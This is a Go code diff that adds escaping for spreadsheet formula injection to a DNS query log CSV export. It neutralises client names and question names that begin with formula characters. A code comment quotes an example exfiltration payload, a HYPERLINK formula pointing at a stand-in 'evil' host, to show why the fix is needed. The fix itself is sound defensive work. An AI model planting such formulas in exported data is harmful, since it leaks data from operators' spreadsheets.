@@ -108,16 +108,33 @@ func createQueryLogRow(logEntry *LogEntry) []string {
 	return []string{
 		logEntry.Start.Format("2006-01-02 15:04:05"),
 		logEntry.ClientIP,
-		strings.Join(logEntry.ClientNames, "; "),
+		escapeSpreadsheetFormula(strings.Join(logEntry.ClientNames, "; ")),
 		strconv.FormatInt(logEntry.DurationMs, 10),
 		logEntry.ResponseReason,
-		logEntry.QuestionName,
+		escapeSpreadsheetFormula(logEntry.QuestionName),
 		logEntry.Answer,
 		logEntry.ResponseCode,
 		logEntry.ResponseType,
 		logEntry.QuestionType,
 		logEntry.BlockyInstance,
 	}
+}
+
+// escapeSpreadsheetFormula neutralises values a spreadsheet would evaluate as a formula.
+// encoding/csv only handles delimiter and quote escaping, so a client name that comes from a
+// client-controlled PTR record (e.g. =HYPERLINK("http://evil/?"&A1,"x")) would be executed when
+// the operator opens the log in Excel, LibreOffice or Sheets. A leading single quote makes the
+// cell literal.
+func escapeSpreadsheetFormula(value string) string {
+	if value == "" {
+		return value
+	}
+
+	if strings.ContainsRune("=+-@\t\r", rune(value[0])) {
+		return "'" + value
+	}
+
+	return value
 }
 
 func createCsvWriter(file io.Writer) *csv.Writer {
